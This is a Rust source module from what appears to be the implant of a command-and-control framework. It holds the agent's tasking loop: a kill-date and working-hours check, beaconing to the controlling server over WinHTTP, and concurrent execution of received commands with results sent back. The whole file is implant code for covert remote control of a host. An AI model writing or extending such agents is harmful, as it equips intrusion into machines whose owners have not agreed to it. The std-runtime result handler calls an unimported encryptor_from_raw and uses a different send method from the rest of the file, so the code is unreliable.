use alloc::sync::Arc;
use std::collections::BTreeMap;
#[cfg(feature = "std-runtime")]
use std::sync::mpsc;
#[cfg(feature = "std-runtime")]
use std::thread::{self, JoinHandle};

use kageshirei_communication_protocol::{
    communication::{AgentCommands, SimpleAgentCommand, TaskOutput},
    error::Format as FormatError,
    Format as _,
    Metadata,
    Protocol as _,
};
use kageshirei_runtime::Runtime;
use libc_print::libc_eprintln;
use mod_agentcore::instance;
#[cfg(feature = "nostd-nt-runtime")]
use mod_nostd::{nostd_mpsc, nostd_thread};
use mod_win32::nt_time::{check_kill_date, is_working_hours};

use super::system::command_exit;
use crate::{
    command::system::command_checkin,
    common::utils::{generate_path, generate_request_id},
    setup::communication::{formatter_from_raw, protocol_from_raw},
};

#[allow(
    clippy::module_name_repetitions,
    reason = "The function is named `command_handler` because it handles incoming commands."
)]
pub fn command_handler<R>(rt: Arc<R>)
where
    R: Runtime + 'static,
{
    unsafe {
        // Check if the session is connected, return early if it's not.
        if !instance().session.connected {
            return;
        }

        // Check if the configured kill date has been reached. If so, exit the command.
        if check_kill_date(instance().config.kill_date) {
            command_exit(0);
        }

        // Verify if the current time is within the allowed working hours. If not, return early.
        if !is_working_hours(&instance().config.working_hours) {
            return;
        }

        // Set up channels for sending and receiving `TaskOutput` results. This section differs based
        // on whether the `std-runtime` or `nostd-nt-runtime` feature is enabled.

        // For the `std-runtime` feature:
        #[cfg(feature = "std-runtime")]
        let (result_tx, result_rx) = mpsc::channel::<TaskOutput>(); // Standard channel for task output communication.

        #[cfg(feature = "std-runtime")]
        let result_handler_handle = result_handler(rt.clone(), result_rx); // Spawn the result handler thread.

        // For the `nostd-nt-runtime` feature:
        #[cfg(feature = "nostd-nt-runtime")]
        let (result_tx, result_rx) = nostd_mpsc::channel::<TaskOutput>(); // No-Std compatible channel.

        #[cfg(feature = "nostd-nt-runtime")]
        let result_handler_handle = result_handler(rt.clone(), result_rx); // Spawn the result handler thread.

        #[cfg(feature = "proto-http-winhttp")]
        {
            // Retrieve the encryptor and protocol objects from the session.
            let protocol = protocol_from_raw(instance().session.protocol_ptr);
            let formatter = formatter_from_raw(instance().session.formatter_ptr);

            // Generate a unique path and request ID for the current task.
            let (_, path, request_id) = generate_path(32, 0, 6);

            // Prepare a new `TaskOutput` object to store metadata and task details.
            let mut data = TaskOutput::new();

            // Create the metadata object, which contains request ID, command ID, and agent ID.
            let metadata = Arc::new(Metadata {
                request_id,
                command_id: generate_request_id(32),
                agent_id: instance().config.id.clone(),
                path: Some(path),
            });

            data.metadata = Some(metadata.clone());

            match formatter.write(data, None::<BTreeMap<&str, &str>>) {
                Ok(data) => {
                    // Use the async runtime to send the `TaskOutput` through the protocol. The write operation is
                    // performed asynchronously, and the result is awaited within a block.
                    let result = rt.block_on(async { protocol.send(data, Some(metadata)).await });

                    match result {
                        Ok(response) => {
                            match formatter.read::<Vec<SimpleAgentCommand>, FormatError>(
                                response.as_slice(),
                                None::<BTreeMap<&str, FormatError>>,
                            ) {
                                Ok(tasks) => {
                                    // Iterate over each task in the list of commands
                                    for command in tasks {
                                        let result_tx = result_tx.clone();
                                        let runtime_clone = Arc::clone(&rt);

                                        // Spawn a new task to handle each command concurrently
                                        runtime_clone.spawn(move || {
                                            let result = match command.op {
                                                AgentCommands::Terminate => command_exit(0),
                                                AgentCommands::Checkin => command_checkin(),
                                                AgentCommands::INVALID => TaskOutput::new(),
                                            };

                                            // Send the result back through the result_tx channel
                                            result_tx.send(result).unwrap();
                                        });
                                    }
                                },
                                Err(e) => {
                                    libc_eprintln!("{:?}", e);
                                },
                            }
                        },
                        Err(_) => {
                            libc_eprintln!("Protocol error");
                        },
                    }
                },
                Err(_) => {
                    // Handle error when writing tasks to protocol
                    // eprintln!("Failed to format data: ");
                },
            }
        }

        #[cfg(feature = "std-runtime")]
        rt.block_on(async {
            drop(result_tx); // Close the result channel, indicating no more tasks will send results.
            result_handler_handle.join().unwrap(); // Wait for the result handler to finish
                                                   // processing all results.
        });

        #[cfg(feature = "nostd-nt-runtime")]
        drop(result_tx); // Close the result channel, indicating no more tasks will send results.
        #[cfg(feature = "nostd-nt-runtime")]
        result_handler_handle.join().unwrap(); // Wait for the result handler to finish processing
                                               // all results.
    }
}

#[cfg(feature = "std-runtime")]
pub fn result_handler<R>(rt: Arc<R>, result_rx: mpsc::Receiver<TaskOutput>) -> JoinHandle<()>
where
    R: Runtime,
{
    // Spawn a separate thread to handle and process the results.
    thread::spawn(move || {
        while let Ok(result) = result_rx.recv() {
            // Create a new reference to protocol inside the loop
            let protocol = unsafe { protocol_from_raw(instance().session.protocol_ptr) };
            let encryptor = unsafe { encryptor_from_raw(instance().session.encryptor_ptr) };

            // Block on the async write operation using the runtime's block_on method
            rt.block_on(async move {
                protocol
                    .write(result.clone(), Some(encryptor.clone()))
                    .await
                    .unwrap();
            });
        }
    })
}

#[cfg(feature = "nostd-nt-runtime")]
#[allow(
    clippy::module_name_repetitions,
    reason = "The function is named `result_handler` because it handles the results of tasks."
)]
pub fn result_handler<R>(rt: Arc<R>, result_rx: nostd_mpsc::Receiver<TaskOutput>) -> nostd_thread::NoStdThread
where
    R: Runtime,
{
    // Spawn a separate thread to handle and process the results.
    let result = nostd_thread::NoStdThread::spawn(move || {
        while let Some(result) = result_rx.recv() {
            // Create a new reference to protocol inside the loop
            let protocol = unsafe { protocol_from_raw(instance().session.protocol_ptr) };
            let formatter = unsafe { formatter_from_raw(instance().session.formatter_ptr) };
            // let encryptor = unsafe { encryptor_from_raw(instance().session.encryptor_ptr) };

            let formatted_data = formatter.write(result.clone(), None::<BTreeMap<&str, &str>>);

            if let Ok(data) = formatted_data {
                // Block on the async write operation using the runtime's block_on method
                #[allow(
                    clippy::let_underscore_must_use,
                    reason = "Result is intentionally ignored as it is not needed for processing"
                )]
                rt.block_on(async move {
                    let _ = protocol.send(data, None).await;
                });
            }
        }
    });

    #[allow(clippy::panic, reason = "The thread handle is expected to be valid")]
    result.unwrap_or_else(|_| {
        panic!("Failed to spawn result handler thread");
    })
}
